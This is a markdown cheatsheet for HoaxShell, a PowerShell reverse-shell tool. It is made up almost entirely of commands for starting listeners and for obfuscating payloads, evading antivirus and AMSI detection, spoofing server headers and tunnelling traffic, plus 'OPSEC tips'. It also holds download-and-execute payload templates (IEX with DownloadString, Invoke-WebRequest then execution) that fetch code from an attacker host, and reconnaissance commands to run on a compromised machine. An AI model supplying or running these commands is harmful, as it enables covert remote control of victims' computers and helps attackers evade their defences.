# HoaxShell Cheatsheet

## Quick Reference

### Starting HoaxShell

```bash
# Basic HTTP listener
sudo hoaxshell -s <your_ip>

# Example
sudo hoaxshell -s 192.168.1.100
```

### Payload Options

```bash
# Basic payload (Invoke-Expression)
sudo hoaxshell -s <your_ip>

# Raw payload (unencoded)
sudo hoaxshell -s <your_ip> -r

# Invoke-RestMethod instead of Invoke-WebRequest
sudo hoaxshell -s <your_ip> -i

# File-based execution (no Invoke-Expression)
sudo hoaxshell -s <your_ip> -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"

# Custom header name
sudo hoaxshell -s <your_ip> -i -H "Authorization"

# Constraint language mode
sudo hoaxshell -s <your_ip> -cm

# Obfuscate payload
sudo hoaxshell -s <your_ip> -o

# Custom server version
sudo hoaxshell -s <your_ip> -v "Apache/2.4.41 (Ubuntu)"
```

### HTTPS Options

```bash
# Self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
sudo hoaxshell -s <your_ip> -c cert.pem -k key.pem

# Trusted domain certificate
sudo hoaxshell -s your.domain.com -t -c cert.pem -k key.pem
```

### Tunneling Options

```bash
# Using ngrok
sudo hoaxshell -ng

# Using localtunnel
sudo hoaxshell -lt
```

### Session Management

```bash
# Restore session
sudo hoaxshell -s <your_ip> -g

# Must use same settings as original session
```

### Port Configuration

```bash
# Default ports:
# HTTP: 8080
# HTTPS: 443

# Custom port
sudo hoaxshell -s <your_ip> -p 9999
```

### Recommended Options

```bash
# Best practice for AV evasion:
sudo hoaxshell -s <your_ip> -i -H "Authorization"

# File-based with custom header:
sudo hoaxshell -s <your_ip> -i -H "Authorization" -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"

# HTTPS with trusted cert:
sudo hoaxshell -s your.domain.com -t -c cert.pem -k key.pem
```

### Command Examples

```bash
# Once connected, run PowerShell commands:
whoami
hostname
ipconfig /all
dir C:\Users
Get-Process
Get-Service
Get-WmiObject -Class Win32_OperatingSystem
```

### Payload Templates

```bash
# Basic Invoke-Expression payload:
# IEX(New-Object Net.WebClient).DownloadString('http://<ip>:<port>/payload.ps1')

# File-based payload:
# Invoke-WebRequest -Uri "http://<ip>:<port>/cmd" -OutFile "C:\temp\cmd.ps1"; . "C:\temp\cmd.ps1"

# Invoke-RestMethod payload:
# IEX(New-Object Net.WebClient).DownloadString('http://<ip>:<port>/payload.ps1')
```

### Custom Server Version

```bash
# Spoof Server header
sudo hoaxshell -s <your_ip> -v "Microsoft-IIS/10.0"
sudo hoaxshell -s <your_ip> -v "Apache/2.4.41 (Ubuntu)"
sudo hoaxshell -s <your_ip> -v "nginx/1.18.0 (Ubuntu)"
```

### Frequency Configuration

```bash
# Default frequency: 0.8s
# Lower = faster shell, more HTTP traffic
# Higher = slower shell, less traffic

sudo hoaxshell -s <your_ip> -f 0.5  # Fast
sudo hoaxshell -s <your_ip> -f 2.0  # Slow
```

### OPSEC Tips

```bash
# Always use -i flag (Invoke-RestMethod)
sudo hoaxshell -s <your_ip> -i

# Set realistic header
sudo hoaxshell -s <your_ip> -i -H "Authorization"

# Use file-based execution
sudo hoaxshell -s <your_ip> -i -x "C:\temp\payload.ps1"

# Obfuscate payload manually
# Use Invoke-Obfuscation or manual techniques
```

### Limitations

```bash
# DO NOT run:
powershell          # Hangs the shell
cmd.exe             # Hangs the shell
interactive.exe     # Hangs the shell

# Safe commands:
cmd /c dir /a       # Works
powershell echo 'test'  # Works
whoami              # Works
hostname            # Works
```

### Troubleshooting

```bash
# Payload doesn't connect
# Check: listener running, IP/port correct, firewall rules

# Shell hangs
# Check: don't use interactive commands

# AMSI detection
# Use: obfuscation, file-based execution, custom header

# Session dropped
# Use: -g flag to restore
```
